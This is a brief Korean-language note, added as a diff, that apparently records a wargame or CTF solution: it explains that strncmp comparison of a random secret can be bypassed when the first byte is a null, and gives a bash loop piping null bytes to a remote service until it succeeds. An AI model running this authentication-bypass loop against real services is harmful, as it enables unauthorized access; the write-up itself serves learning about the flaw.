@@ -1,0 +1,10 @@
+strncmp 함수에 취약점이 존재한다.
+
+http://gnu-cse.tistory.com/39
+
+bash 열고, 
+
+while true; do perl -e 'print "\x00"x8' | ssh ip port | done
+
+을 입력하게 되면, 몇번 돌다가 /dev/urandom 에서 첫번째 바이트가 \x00 일때
+두 개의 인자 모두 첫번째 바이트가 \x00 이니까 비교할게 없어서 true가 된다. 
